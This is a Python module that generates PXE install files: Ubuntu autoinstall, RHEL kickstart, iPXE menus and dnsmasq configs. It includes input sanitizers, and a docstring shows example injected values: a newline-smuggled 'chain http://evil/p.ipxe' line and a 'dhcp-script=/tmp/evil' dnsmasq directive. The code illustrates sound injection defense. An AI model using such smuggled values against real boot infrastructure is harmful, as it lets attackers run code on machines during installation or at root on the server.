"""PXE 装机配置生成器。

生成四类文件：
  1. Ubuntu autoinstall (user-data, cloud-init subiquity)
  2. RHEL Kickstart (ks.cfg)
  3. iPXE 启动菜单脚本
  4. dnsmasq 配置 (DHCP + TFTP + PXE)
"""
from __future__ import annotations

import json
import re
from passlib.hash import sha512_crypt
import shlex
from dataclasses import dataclass, replace


# ── D7 第 3 层：输出侧兜底 ──
# 输入侧已在 schemas.py / api/pxe.py 校验，但生成器必须自己也不信任入参：
# mac/hostname 会被拼进 dnsmasq 配置、iPXE 脚本、cloud-init meta-data 与【文件名】。
_MAC_RE = re.compile(r"^[0-9a-f]{2}(:[0-9a-f]{2}){5}$")
# 主机名用字符白名单而不是严格 RFC1123：对既有合法输入（含 FQDN）保持恒等，
# 只剔除换行/分号/反引号之类可注入字符。
_HOST_UNSAFE_RE = re.compile(r"[^A-Za-z0-9.-]")
_USER_UNSAFE_RE = re.compile(r"[^A-Za-z0-9_-]")


def _safe_mac(mac) -> str:
    """只接受 aa:bb:cc:dd:ee:ff 形式的 MAC，否则返回空串（调用方跳过该条）。"""
    m = str(mac or "").strip().lower()
    return m if _MAC_RE.fullmatch(m) else ""


def _mac_tag(mac: str) -> str:
    """MAC -> 可作为 dnsmasq tag、也可安全用作文件名的片段（只含 [0-9a-f-]）。"""
    return mac.replace(":", "-")


def _safe_hostname(name, fallback="server01") -> str:
    """主机名只保留 [A-Za-z0-9.-]，其余字符剔除；清空则用 fallback。"""
    n = _HOST_UNSAFE_RE.sub("", str(name or "").strip())
    return n or fallback


def _safe_username(name, fallback="ops") -> str:
    """管理员用户名只保留 [A-Za-z0-9_-]，且不得以 '-' 开头；清空则用 fallback。

    defense-in-depth：schema 层已有白名单，但 admin_user 会落进
    RHEL kickstart 的 %post（**以 root 执行**）与 autoinstall 的 YAML，
    生成器必须自己也不信任入参。
    """
    n = _USER_UNSAFE_RE.sub("", str(name or "").strip())
    n = n.lstrip("-")
    return n or fallback


# 内核控制台默认值。放在模块级是为了让 api 层与 dataclass 默认值共用同一个来源，不会走偏。
# **默认开启串口**：PXE 装的多是机房里没接显示器的机器，装机中途失败时，串口日志是唯一能看到
# "内核收到的真实 cmdline / cloud-init 报错 / OOM / curtin 卡在哪一步" 的地方 ——
# 本项目就是靠它定案的（没有串口时白白浪费了一轮 14 分钟的装机验证，日志全是空的）。
# 顺序有讲究：最后一个 console= 才是 /dev/console。
#   默认 tty0 在前、ttyS0 在后 → /dev/console=ttyS0，安装器界面与 subiquity 日志都走串口，
#   适合无人值守/远程运维；
#   若要把界面留在显示器上（串口只收内核/ systemd 消息），改成
#   "console=ttyS0,115200 console=tty0"；置空串则完全不带 console=。
DEFAULT_KERNEL_CONSOLE = "console=tty0 console=ttyS0,115200"


@dataclass
class PxeConfig:
    os_type: str = "ubuntu"
    os_version: str = "22.04"
    hostname: str = "server01"
    timezone: str = "Asia/Shanghai"
    locale: str = "en_US.UTF-8"
    keyboard: str = "us"
    admin_user: str = "ops"
    admin_password: str = ""
    root_password: str = ""
    ssh_keys: list = None
    disk_scheme: str = "lvm"
    disk_config: dict = None
    net_mode: str = "dhcp"
    net_config: dict = None
    mirror: str = ""
    # RHEL 系：stage2（含 images/install.img 的那一层 URL）与额外仓库。
    # 为什么必须分开：把 DVD ISO 树挂出来当安装源时，包仓库是 **BaseOS/** 与 **AppStream/**
    # 两个子目录，而 `images/install.img` 在**树根**。只给 `inst.repo=<BaseOS/>` 时：
    #   · anaconda 找不到 stage2 → dracut "Could not boot / /dev/root does not exist"；
    #   · 装完包后在认证步骤崩 → SecurityInstallationError: /usr/sbin/authconfig is missing
    #     （authconfig 在 AppStream 里，而贴出的 kickstart 有 auth --enableshadow）。
    # 两者都有真机串口实证。api 层会在 mirror 是本机发布目录时自动探测这两项，
    # 运维通常只需填 mirror。
    stage2: str = ""
    extra_repos: list = None    # [{"name": "AppStream", "url": "http://.../AppStream/"}]
    extra_packages: list = None
    post_script: str = ""
    server_ip: str = "192.168.1.100"
    http_root: str = "http://192.168.1.100:8000/pxe/serve"
    kernel_path: str = "ubuntu/22.04/vmlinuz"
    initrd_path: str = "ubuntu/22.04/initrd"
    squashfs_path: str = "ubuntu/22.04/installer.squashfs"
    # 内核控制台，见 DEFAULT_KERNEL_CONSOLE 的说明
    kernel_console: str = DEFAULT_KERNEL_CONSOLE
    # 可挂载的安装介质 URL（casper 的 url= 参数）。
    # 为什么必须有它：live-server 的 casper 需要一个**可挂载介质**才能建立 live 文件系统。
    # 旧写法用相对位置参数 `--- ubuntu/22.04/installer.squashfs` 实测直接失败：
    #   "Unable to find a medium containing a live file system"
    # 而 `url=http://host/pxe/iso/xxx.iso` 实测可用。见 _ipxe_menu() 的注释。
    iso_url: str = ""
    # 该 ISO 的大小（MB）。由 api 层 stat 后填进来，生成器保持纯函数；
    # 只用于在 README 里给出"目标机内存要多大"的具体数字。
    iso_size_mb: int = 0
    deploy_mode: str = "standalone"  # standalone(独立DHCP) / proxy(ProxyDHCP) / relay(中继模式)


# 装机流程只有两条：ubuntu（casper/autoinstall）与 RHEL 家族（anaconda/kickstart）。
# RHEL 家族与 rhel 完全同构 —— 同一套 inst.* 参数、同一个 kickstart 生成器，
# 介质文件名也一样是 initrd.img（不是 Ubuntu 的 initrd）。
# 校验层 schemas._OS_TYPE_ALLOWED 必须与此一致，有测试锁住两者不漂移。
RHEL_FAMILY = ("rhel", "centos", "rocky", "alma", "almalinux", "redhat")


def is_rhel_family(os_type) -> bool:
    """是否属于 RHEL 家族（决定走 anaconda 分支与 initrd.img 介质路径）。"""
    return (os_type or "").strip().lower() in RHEL_FAMILY


# Ubuntu ISO 文件名里 OS 类型的关键字（用于自动挑选镜像）
_ISO_TYPE_KEYS = {
    "ubuntu": ("ubuntu",),
    "rhel": ("rhel", "redhat", "centos", "rocky", "almalinux", "oraclelinux"),
}


# 版本号按"数字段边界"抽取，避免子串误配：ver="9" 不该命中 "Rocky-19.4"，
# "22.04" 也不该命中 "122.04"。
_ISO_VER_RE = re.compile(r"(?<![0-9])(\d+(?:\.\d+)*)(?![0-9])")


def _iso_versions(name: str) -> list:
    """取出文件名里的所有版本号候选（小写）。"""
    return _ISO_VER_RE.findall(name.lower())


def pick_iso(names, os_type: str, os_version: str) -> str:
    """从 /srv/opstk/iso 的文件名列表里挑出最匹配 os_type/os_version 的那个 ISO。

    纯函数（不做 I/O），便于单测。返回文件名，挑不到返回 ""。

    匹配规则（正式环境里同目录会同时存在多个系统镜像，必须挑准）：
      1. 必须含该 OS 类型的任一关键字；
      2. 版本按**数字段边界**匹配：查询 `22.04` 命中文件名里的 `22.04` 或 `22.04.5`，
         但不命中 `24.04`；查询 `9` 命中 `9`/`9.4`，但不命中 `19.4`
         （旧实现用 `ver in low` 子串匹配，会被 `Rocky-19.x` 这类名字误配）；
      3. 只认 .iso；
      4. 优先级：版本号段数多者优先（22.04.5 比 22.04 更精确）→ live-server 优先
         → 文件名排序兜底，保证结果确定、可复现。
    """
    ost = (os_type or "ubuntu").strip().lower()
    ver = (os_version or "").strip().lower()
    keys = _ISO_TYPE_KEYS.get(ost, (ost,))
    cands = []
    for n in names or []:
        base = str(n).strip()
        low = base.lower()
        if not low.endswith(".iso"):
            continue
        if not any(k in low for k in keys):
            continue
        if not ver:
            score = 0
        else:
            hit = None
            for tok in _iso_versions(low):
                if tok == ver or tok.startswith(ver + "."):
                    hit = tok
                    break
            if hit is None:
                continue
            # 段数取自**文件名里实际命中的那个版本**。旧实现写的是 len(ver.split("."))，
            # 对一次查询而言是常量，"版本段数多者优先（22.04.5 > 22.04）"实际从未生效。
            score = len(hit.split("."))
        cands.append((score, "live-server" in low, base))
    if not cands:
        return ""
    cands.sort(key=lambda t: (t[0], t[1], t[2]))
    return cands[-1][2]


def _hash_pw(plaintext):
    # 空/None 口令直接拒绝：这是裸机 root/管理员口令，绝不代填任何默认口令
    if not plaintext:
        raise ValueError("管理员密码不能为空；这是裸机 root 口令，不允许留空")
    return sha512_crypt.using(rounds=5000).hash(plaintext)


# ===== Ubuntu autoinstall =====
def _ubuntu_user_data(c):
    dc = c.disk_config or {}
    nc = c.net_config or {}
    # D7 第 3 层：主机名与管理员用户名都会落进 YAML，先做字符白名单。
    # admin_user 的注入面已实测可利用（RHEL ks 的 %post 以 root 执行，含 `;` 即可注入命令；
    # autoinstall 的 YAML 值含换行即可插入 `groups: [sudo]` 之类的新键）——
    # 主防线是 schemas.py 的用户名白名单，这里是 defense-in-depth 兜底。
    hn = _safe_hostname(c.hostname)
    admin = _safe_username(c.admin_user)
    disk = dc.get("disk")

    scheme = c.disk_scheme
    if scheme not in ("lvm", "direct", "zfs"):
        scheme = "lvm"
    cfg = {"name": scheme}
    if disk is not None:
        cfg["match"] = {"path": "/dev/" + disk}
    storage = json.dumps({"layout": cfg})

    if c.net_mode == "static":
        iface = nc.get("interface", "ens33")
        addr = nc.get("ip", "10.0.0.10") + "/" + str(nc.get("cidr", 24))
        eth = {iface: {
            "addresses": [addr],
            "routes": [{"to": "default", "via": nc.get("gateway", "10.0.0.1")}],
            "nameservers": {"addresses": nc.get("dns", ["8.8.8.8"])}},
        }
        network = json.dumps({"version": 2, "renderer": "networkd", "ethernets": eth})
    else:
        network = json.dumps({"version": 2, "renderer": "networkd"})

    lines = [
        "#cloud-config",
        "# Ubuntu Server autoinstall - subiquity",
        "autoinstall:",
        "  version: 1",
        "  locale: " + c.locale,
        "  keyboard: {layout: " + c.keyboard + "}",
        "  timezone: " + c.timezone,
        "  identity:",
        "    realname: '" + admin + "'",
        "    username: " + admin,
        "    hostname: " + hn,
        "    password: '" + _hash_pw(c.admin_password) + "'",
        "  storage: " + storage,
        "  network: " + network,
    ]
    if c.ssh_keys:
        lines.append("  ssh:")
        lines.append("    authorized-keys: " + json.dumps(c.ssh_keys))
    if c.mirror:
        lines.append("  apt:")
        lines.append("    primary:")
        lines.append("      - arches: [amd64]")
        lines.append("        uri: " + c.mirror)
    # 配了 authorized-keys 就必须把 openssh-server 装上：只写 ssh_keys 不装包，
    # 等于配了一组永远用不上的钥匙（22.04 live-server 最小安装不含 openssh-server）。
    pkgs = list(c.extra_packages or [])
    if c.ssh_keys and "openssh-server" not in pkgs:
        pkgs.append("openssh-server")
    if pkgs:
        lines.append("  packages: " + json.dumps(pkgs))
    lines.append("  late-commands:")
    if c.post_script:
        shell_quoted = shlex.quote(c.post_script)
        full_cmd = "curtin in-target --target=/target -- bash -c " + shell_quoted
        lines.append("    - " + json.dumps(full_cmd))
    # 这条必须容错。真机实测（22.04 live-server 最小安装）里 ssh 单元根本不存在，
    # 命令返回 1，curtin 于是把**已经装好的系统**判成 install_fail：
    #   串口实证 "Command '[... systemctl enable ssh]' returned non-zero exit status 1"
    #   → subiquity/ErrorReporter/install_fail → 界面停在 "An error occurred"；
    # 而且它后面的 `reboot` 再也执行不到，无人值守装机就卡死在报错界面。
    # 装 ssh 靠上面的 packages，启用失败不该把整台机器的装机判为失败。
    lines.append("    - curtin in-target --target=/target -- systemctl enable ssh || true")
    lines.append("    - reboot")
    return "\n".join(lines) + "\n"


# ===== RHEL Kickstart =====
def _rhel_ks(c):
    dc = c.disk_config or {}
    nc = c.net_config or {}
    disk = dc.get("disk", "sda")
    # %post 以 root 执行，admin_user 必须收敛到安全字符集
    admin = _safe_username(c.admin_user)

    if c.disk_scheme == "direct":
        parts = (
            "clearpart --drives=" + disk + " --all --initlabel\n"
            "part /boot/efi --fstype=efi --size=512\n"
            "part / --fstype=ext4 --ondisk=" + disk + " --grow\n"
            "part swap --size=8192\n"
        )
    else:
        parts = (
            "clearpart --drives=" + disk + " --all --initlabel\n"
            "part /boot/efi --fstype=efi --size=512\n"
            "part /boot --fstype=ext4 --size=1024\n"
            "part pv.01 --size=1 --grow\n"
            "volgroup vg0 pv.01\n"
            "logvol / --vgname=vg0 --name=root --size=20480 --fstype=ext4\n"
            "logvol swap --vgname=vg0 --name=swap --size=8192\n"
            "logvol /home --vgname=vg0 --name=home --size=10240 --fstype=ext4\n"
        )

    if c.net_mode == "static":
        net = ("network --bootproto=static --device=" + nc.get("interface", "ens33") +
               " --ip=" + nc.get("ip", "10.0.0.10") +
               " --netmask=" + nc.get("netmask", "255.255.255.0") +
               " --gateway=" + nc.get("gateway", "10.0.0.1") +
               " --nameserver=" + ",".join(nc.get("dns", ["8.8.8.8"])) +
               " --hostname=" + c.hostname + " --activate")
    else:
        net = "network --bootproto=dhcp --hostname=" + c.hostname + " --activate"

    q = chr(34)
    _mirror = _safe_ident(c.mirror, "mirror", extra=":/?&=%+")
    repo = ("url --url=" + q + _mirror + q + "\n"
            if _mirror else "# url --url=" + q + "http://mirror/rocky/9/BaseOS/x86_64/os/" + q + "\n")
    # 额外仓库（如 AppStream）必须在 **kickstart 里也声明**：inst.addrepo 只作用于安装器
    # 命令行，kickstart 安装期间的包解析用的是 ks 自己的 repo 列表。
    # 实测教训：只给 BaseOS 时，装完 326 个包后死在
    #   SecurityInstallationError: /usr/sbin/authconfig is missing（authconfig 在 AppStream）。
    for _r in (c.extra_repos or []):
        _n = _safe_ident((_r or {}).get("name", ""), "extra_repos[].name")
        _u = _safe_ident((_r or {}).get("url", ""), "extra_repos[].url", extra=":/?&=%+")
        if _n and _u:
            repo += "repo --name=" + q + _n + q + " --baseurl=" + q + _u + q + "\n"

    pkgs = c.extra_packages or ["vim", "net-tools", "bash-completion", "tar", "wget", "curl"]

    L = [
        "# RHEL / Rocky / Alma Linux Kickstart",
        "lang " + c.locale,
        "keyboard --vckeymap=" + c.keyboard,
        "timezone " + c.timezone,
        "",
        repo.rstrip(),
        "",
        net,
        "",
        "auth --enableshadow --passalgo=sha512",
        # 口令回退保持可用：rootpw 优先 root_password、其次 admin_password；两者都空时 _hash_pw 抛 ValueError
        "rootpw --iscrypted " + _hash_pw(c.root_password or c.admin_password),
        # user 行同样两者都空才报错：仅填 root_password 时 admin 口令沿用同一来源，绝不代填默认口令
        # M1：kickstart 的 user --password 默认按【明文】解释。缺 --iscrypted 时，
        # _hash_pw() 产出的 "$6$rounds=5000$..." 这一整串密文会被当成口令本身，
        # 于是管理员账号永远无法用预期口令登录。rootpw 那行本来就有 --iscrypted。
        "user --name=" + admin + " --iscrypted --password=" + _hash_pw(c.admin_password or c.root_password) + " --gecos=" + chr(34) + admin + chr(34) + " --groups=wheel",
        "",
        parts.rstrip(),
        "bootloader --location=mbr --boot-drive=" + disk,
        "selinux --permissive",
        "firewall --enabled --ssh",
        "services --enabled=sshd,NetworkManager",
        "firstboot --disable",
        "eula --agreed",
        "reboot",
        "",
        "%packages --ignoremissing",
    ]
    L.extend(pkgs)
    L.append("%end")
    if c.ssh_keys or c.post_script:
        L.append("")
        L.append("%post --interpreter=/bin/bash")
        for k in c.ssh_keys or []:
            # 原实现用 chr(39)+k+chr(39) 手工拼单引号：key 里含单引号即可逃出引号再注入命令。
            # 改用 shlex.quote（对正常公钥是恒等变换，见 NC1 的恒等性论证）。
            L.append("mkdir -p /home/" + admin + "/.ssh && echo "
                     + shlex.quote(str(k)) + " >> /home/" + admin + "/.ssh/authorized_keys")
        L.append("chown -R " + admin + ":" + admin + " /home/" + admin + "/.ssh")
        if c.post_script:
            L.append(c.post_script)
        L.append("%end")
    return "\n".join(L) + "\n"


def _safe_line(v, field="字段") -> str:
    """第 3 层兜底：值会被原样拼进 iPXE 脚本 / dnsmasq.conf，而两者都以**换行分隔**命令/指令。

    所以值里出现换行或任何控制字符（含 TAB/CR）就等于注入一整行：
      iso_url="http://x/y.iso\\nchain http://evil/p.ipxe" → 裸机装机时执行攻击者脚本
      http_root="http://x\\ndhcp-script=/tmp/evil"        → dnsmasq 指令注入；该 conf 由
        **宿主 root dnsmasq** 加载（compose 把 /etc/dnsmasq.d 挂进容器）→ root 级影响面

    第 2 层（schemas.PxeGenerateIn / PxeProfileIn 的 field_validator）已经拦一次；
    这里再挡一次，保证任何绕过 HTTP 层的调用方（脚本、直接调 generate_all）也注入不进去。
    """
    s = str(v if v is not None else "")
    for ch in s:
        if ord(ch) < 0x20 or ord(ch) == 0x7F:
            raise ValueError(
                field + " 不允许包含换行或控制字符（会造成 iPXE/dnsmasq 配置注入）"
            )
    return s


def _safe_ident(v, field, extra="") -> str:
    """比 _safe_line 更严：只允许 [A-Za-z0-9._-] 以及调用方指定的额外字符。

    这些值会以 `--name="X"` / `inst.addrepo=Name,URL` 的形式进入 kickstart 与内核
    命令行 —— 引号、逗号、空格会改变**语法结构**，不只是控制字符那类问题。
    """
    s = _safe_line(v, field)
    if not s:
        return ""
    ok = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-") | set(extra)
    bad = sorted({ch for ch in s if ch not in ok})
    if bad:
        raise ValueError(field + " 含不允许的字符 " + repr("".join(bad)))
    return s


def _extra_repo_args(repos) -> str:
    """把额外仓库拼成 `inst.addrepo=Name,URL`（逗号是 anaconda 的分隔符，值里不能有）。"""
    out = ""
    for r in repos or []:
        name = _safe_ident((r or {}).get("name", ""), "extra_repos[].name")
        url = _safe_ident((r or {}).get("url", ""), "extra_repos[].url", extra=":/?&=%+")
        if name and url:
            out += " inst.addrepo=" + name + "," + url
    return out


# ===== iPXE 菜单 =====
def _ipxe_menu(c, mac="", answer_url=""):
    # 第 3 层兜底：统一先净化再拼接（见 _safe_line 的说明）
    http_root = _safe_line(c.http_root, "http_root")
    kernel_path = _safe_line(c.kernel_path, "kernel_path")
    initrd_path = _safe_line(c.initrd_path, "initrd_path")
    iso_url = _safe_line(c.iso_url, "iso_url")
    kernel_console = _safe_line(c.kernel_console, "kernel_console")
    mirror = _safe_line(c.mirror, "mirror")

    kernel = http_root + "/" + kernel_path
    initrd = http_root + "/" + initrd_path
    # UEFI 必须在内核命令行上给出 initrd 的名字，且要与 iPXE `initrd` 命令注册的名字一致
    # （即该 URL 的 basename，可用 iPXE 的 imgstat 看到）。**BIOS 下这是 NO-OP**，
    # 所以两种固件统一带上，不需要分支。
    # 实测证据（VM141 / OVMF）：不带它时内核 panic
    #   "VFS: Cannot open root device \"ram0\" or unknown-block(0,0): error -6"
    # 而 iPXE 其实**已经**把 initrd 下载下来了（HTTP 日志里有 GET .../initrd），
    # 只是没交给内核 —— 同一份配置在 SeaBIOS 下完全正常。
    # 出处：iPXE 维护者 Robin Smidsrød 在 ipxe-devel 邮件列表的说明。
    initrd_name = initrd_path.rsplit("/", 1)[-1]
    # D7 第 3 层：主机名/mac 会落进 iPXE 脚本的注释行，先做字符白名单
    hn = _safe_hostname(c.hostname)
    mac_s = _safe_mac(mac) or "auto"
    if (c.os_type or "").strip().lower() == "ubuntu":
        seed = _safe_line(answer_url, "answer_url") or (http_root + "/")
        if not seed.endswith("/"):
            seed += "/"
        # Ubuntu 装机链路的两条**实测定案**（在 PVE 真机跑出来过，证据在内核串口里）：
        #
        # 1) 配置投递用 cloud-config-url，不再用 `ds=nocloud-net;s=<seed>`。
        #    后者依赖 iPXE 把 `;` 传给内核，而 iPXE 不认反斜杠转义：`\;` 会以字面反斜杠
        #    进入内核命令行（串口 dmesg 实证
        #    "Kernel command line: ... ds=nocloud\;s=http://..."），
        #    于是 DataSourceNoCloud.parse_cmdline_data() 里要求精确子串 " ds=nocloud;"
        #    的判定失配 → 数据源退化成 none → 安装器进交互模式，autoinstall 永不生效。
        #    cloud-config-url 是纯 key=value，没有分号、没有转义，跨 iPXE/GRUB/syslinux 都稳。
        #
        # 2) 必须同时给 `url=<可挂载 ISO 的 URL>`，不能用相对位置参数
        #    `--- <squashfs_path>`：后者实测失败
        #    "Unable to find a medium containing a live file system"，
        #    因为 casper 需要一个**可挂载介质**才能建立 live 文件系统。
        #
        # 还有一个必须绕开的坑：cloud-init 自己也会解析 `url=`（cmd/main.py 的
        # parse_cmdline_url(names=("cloud-config-url", "url")) 取第一个命中的键）。
        # 只写 url=<ISO> 时，cloud-init 会把 2GB 的 ISO 当成配置文件流式下载进内存
        # （实测 3.66GB anon RSS → cloud-init 被 OOM 杀，local/network 两个 stage 全 FAILED）。
        # 带上 cloud-config-url 后按顺序先命中它，cloud-init 就不会再碰 url=。
        if not iso_url:
            raise ValueError(
                "Ubuntu 装机必须指定可挂载的安装介质：模板未提供 iso_url，"
                "且 /srv/opstk/iso 中没有与 os_type/os_version 匹配的镜像。"
                "请把对应 ISO 放入 /srv/opstk/iso，或在生成参数里显式传 iso_url。"
            )
        cmdline = ("autoinstall cloud-config-url=" + seed + "user-data "
                   "ip=dhcp url=" + iso_url)
        if kernel_console:
            cmdline += " " + kernel_console
        L = ["#!ipxe", "# boot: " + hn + " (MAC " + mac_s + ")",
             "kernel " + kernel + " root=/dev/ram0 initrd=" + initrd_name + " " + cmdline,
             "initrd " + initrd, "boot"]
    else:
        # D17：RHEL 装机必须有可用的安装源。本机**从不**发布 ISO 仓库树
        # （extract_from_iso() 只拷 vmlinuz/initrd.img，那个目录里没有 repomd.xml，
        # 不是合法的 anaconda 仓库），所以旧的 "c.mirror or http_root + '/os'"
        # 只会产出一个 404 的 inst.repo，装机必然失败。
        # 这里显式失败：api/pxe.py 的 _gen_pxe_files() 已把 ValueError 映射成 422 + 中文提示。
        if not mirror:
            raise ValueError(
                "RHEL 系装机必须提供可用的安装源 mirror：本机未发布 ISO 仓库树，"
                "无法为 inst.repo 提供内容。请填写模板的 mirror，或先自行发布安装源。"
            )
        answer = _safe_line(answer_url, "answer_url") or (http_root + "/ks.cfg")
        stage2 = _safe_line(c.stage2, "stage2")
        args = ("kernel " + kernel + " initrd=" + initrd_name + " inst.ks=" + answer)
        if stage2:
            args += " inst.stage2=" + stage2
        args += " inst.repo=" + mirror
        if c.extra_repos:
            args += _extra_repo_args(c.extra_repos)
        args += " ip=dhcp" + (" " + kernel_console if kernel_console else "")
        L = ["#!ipxe", "# boot: " + hn + " (MAC " + mac_s + ")", args,
             "initrd " + initrd, "boot"]
    return "\n".join(L) + "\n"


# ===== dnsmasq 配置 =====
def _dnsmasq(c, installs=None):
    """三种部署模式：
    standalone - 独立 DHCP（专用装机网络，裸机接入即装）
    proxy      - ProxyDHCP（与现有 DHCP 并存，只提供 PXE 引导信息，不分配 IP）
    relay      - 中继模式（本机只做 TFTP/HTTP 文件服务；引导文件名由外部 DHCP 提供）

    两阶段引导（D21）的设计要点：dnsmasq man page 对 `--dhcp-boot` **只规定 tag 必须匹配，
    未规定多条同时匹配时哪条胜出**。因此这里用 `tag-if` 造【两两互斥】的 tag，
    让每条 `dhcp-boot` 只带一个 tag，完全不依赖优先级语义。
    （该结构已用 netns 隔离的 dnsmasq + 自造 DHCP 包实测 7 个场景验证，见 RUNBOOK-D21-verified.md。）
    """
    installs = installs or []
    nc = c.net_config or {}
    iface = nc.get("interface", "eth0")
    gateway = nc.get("gateway", "192.168.1.1")
    mode = c.deploy_mode or "standalone"

    L = [
        "# dnsmasq PXE 配置 (OpsToolkit 生成)",
        "# 部署模式: " + _mode_label(mode),
        "port=0",
        "bind-interfaces",
        "",
    ]
    if iface:
        L.insert(3, "interface=" + iface)  # 在 port=0 后插入接口绑定

    # D7 第 3 层：只接受合法 MAC，非法直接跳过（防注入进 dhcp-host 与文件名）
    reg = []
    for inst in installs:
        mac = _safe_mac(inst.get("mac"))
        if not mac:
            continue
        reg.append((mac, _mac_tag(mac)))

    if mode == "relay":
        # M6：原实现同时写了 interface=<iface> 与 no-dhcp-interface=<iface>。
        # `--no-dhcp-interface` 的语义是"在该接口上不提供 DHCP、**TFTP** 与 RA"，
        # 两条叠加后此接口上什么都不服务（连 enable-tftp 也失效），且没有 dhcp-range 时
        # dhcp-match/dhcp-boot 永远不会被下发 —— 是彻底的死配置。
        # 而 relay 也无法改成 proxy 语义：proxy 的 dhcp-range=<本机IP>,proxy 要靠该地址
        # 反推【客户端所在子网】，本应用只有 server_ip、没有客户端子网输入，
        # 无法为中继过来的异地子网构造正确的 proxy range。
        # 所以 relay 的正确语义是：本机只供文件，引导文件名由外部 DHCP 提供。
        L.append("# 中继模式：本机只提供 TFTP/HTTP 文件；DHCP 与引导文件名由外部负责")
        L.append("# 外部 DHCP 需要下发：")
        L.append("#   option 66 (tftp-server-name) = " + (c.server_ip or "本机IP"))
        L.append("#   option 67 (bootfile-name)    = undionly.kpxe   (传统 BIOS)")
        L.append("#                                = ipxe.efi        (x86_64 UEFI, arch 7/9)")
        L.append("#                                = ipxe-i386.efi   (32 位 UEFI, arch 6)")
        L.append("# 若希望由本机自行下发两阶段引导信息，请改用 proxy 模式，")
        L.append("# 并确保交换机 IP Helper 指向本机。")
        L.append("#")
        L.append("# 注意：中继模式下本机不是 DHCP 服务器，所以本工具生成的【每台机器定制菜单】")
        L.append("# （boot/<mac>.ipxe，里面才是各自的 hostname 与应答文件路径）不会被自动下发。")
        L.append("# 需要按 MAC 定制时，让外部 DHCP 直接把 option 67 下发成该机器的 URL")
        L.append("# （iPXE 客户端支持 URL，MAC 用短横线形式）：")
        L.append("#   option 67 = " + c.http_root + "/boot/<mac>.ipxe   例如 " + c.http_root
                 + "/boot/" + (_mac_tag(reg[0][0]) if reg else "aa-bb-cc-dd-ee-ff") + ".ipxe")
        L.append("# 否则机器只会被带到通用 boot.ipxe，按 MAC 定制的 hostname 不会生效。")
        L.append("")
        L.append("enable-tftp")
        L.append("tftp-root=/srv/tftp")
        L.append("")
        return "\n".join(L) + "\n"

    if mode == "proxy":
        # ProxyDHCP：不分配 IP，只提供 PXE 引导信息，与现有 DHCP 并存
        pxeserver = c.server_ip or "192.168.1.100"
        L.append("# ProxyDHCP 模式: 不分配 IP，仅提供 PXE 引导，与现有 DHCP 服务器并存")
        L.append("# pxeserver 必须是本机对外 IP")
        L.append("dhcp-range=" + pxeserver + ",proxy")
        L.append("dhcp-option=option:server-ip-address," + pxeserver)
    else:
        # standalone：独立 DHCP + TFTP，完整分配 IP
        L.append("# 独立 DHCP 模式: 完整分配 IP + PXE 引导（确保网段内无其他 DHCP）")
        L.append("dhcp-range=" + nc.get("dhcp_start", "192.168.1.100") + ","
                 + nc.get("dhcp_end", "192.168.1.200") + ",12h")
        L.append("dhcp-option=option:router," + gateway)
        L.append("dhcp-option=option:dns-server," + nc.get("dns_server", gateway))

    L.append("")
    L.append("enable-tftp")
    L.append("tftp-root=/srv/tftp")
    L.append("")
    L.append("# 客户端分类：option 93 = 客户端架构；option 175 = iPXE 自报")
    L.append("# arch 7/9 = x86_64 UEFI，arch 6 = 32 位 UEFI，无 arch = 传统 BIOS")
    L.append("dhcp-match=set:efi-x86_64,option:client-arch,7")
    L.append("dhcp-match=set:efi-x86_64,option:client-arch,9")
    L.append("dhcp-match=set:efi-ia32,option:client-arch,6")
    L.append("dhcp-match=set:ipxe,175")
    for mac, tag in reg:
        L.append("dhcp-host=" + mac + ",set:pxe_" + tag)
    L.append("")
    L.append("# 用 tag-if 造两两互斥的 tag：每条 dhcp-boot 只带一个 tag，不依赖优先级")
    L.append("tag-if=set:fw-x64,tag:!ipxe,tag:efi-x86_64")
    L.append("tag-if=set:fw-ia32,tag:!ipxe,tag:efi-ia32")
    L.append("tag-if=set:fw-bios,tag:!ipxe,tag:!efi-x86_64,tag:!efi-ia32")
    L.append("tag-if=set:fw-menu,tag:ipxe")
    L.append("")
    L.append("# 第一阶段：PXE 固件取 iPXE 二进制，按架构区分")
    if mode == "proxy":
        # D5 的真实缺陷是：proxy 分支用了 tag:efi-x86_64 / tag:!efi-x86_64，
        # 却**从未设置** efi-x86_64 这个 tag（standalone/relay 分支才有 dhcp-match），
        # 于是 tag:!efi-x86_64 恒真 —— UEFI 机器永远拿到 undionly.kpxe（BIOS 二进制）。
        # 注意：proxy 模式下引导信息必须靠 pxe-service 传递（这是 dnsmasq 的 PXE 代理机制，
        # man page 在 dhcp-range 的 proxy 模式里就指向 --pxe-service）。
        # 实测：把 pxe-service 换成 dhcp-boot 会让 proxy 完全不下发引导信息，故保留 pxe-service。
        L.append("# ProxyDHCP 用 pxe-service 下发（PXE 代理机制；纯 dhcp-boot 在 proxy 下不下发）")
        L.append('pxe-service=tag:fw-x64,X86-64_EFI,"PXE Boot",ipxe.efi')
        L.append('pxe-service=tag:fw-ia32,IA32_EFI,"PXE Boot",ipxe-i386.efi')
        L.append('pxe-service=tag:fw-bios,x86PC,"PXE Boot",undionly.kpxe')
    else:
        L.append("# 独立 DHCP 用 dhcp-boot 下发（TFTP 文件名）")
        L.append("dhcp-boot=tag:fw-x64,ipxe.efi")
        L.append("dhcp-boot=tag:fw-ia32,ipxe-i386.efi")
        L.append("dhcp-boot=tag:fw-bios,undionly.kpxe")
    L.append("")
    L.append("# 第二阶段：iPXE 自己再次 DHCP 时下发【脚本 URL】（HTTP），而不是固件")
    L.append("# 按 MAC 指定 iPXE 菜单 (tag 方式, 避免 URL 被当作 hostname)")
    for mac, tag in reg:
        L.append("tag-if=set:fw-menu-" + tag + ",tag:fw-menu,tag:pxe_" + tag)
        L.append("dhcp-boot=tag:fw-menu-" + tag + "," + c.http_root + "/boot/" + tag + ".ipxe")
    # 默认菜单对**所有**已登记 MAC 取反，从而与上面每台机的专属菜单互斥
    neg = "".join(",tag:!pxe_" + t for _, t in reg)
    L.append("tag-if=set:fw-menu-def,tag:fw-menu" + neg)
    L.append("dhcp-boot=tag:fw-menu-def," + c.http_root + "/boot.ipxe")
    L.append("")
    return "\n".join(L) + "\n"


def _mode_label(mode):
    return {
        "standalone": "standalone - 独立 DHCP (专用装机网络)",
        "proxy": "proxy - ProxyDHCP (与现有 DHCP 并存)",
        "relay": "relay - 中继模式 (仅 TFTP, 依赖交换机中继)",
    }.get(mode, mode)





def _readme(c):
    iso_mb = int(c.iso_size_mb or 0)
    ram_mb = (iso_mb + 1536) if iso_mb else 0
    return (
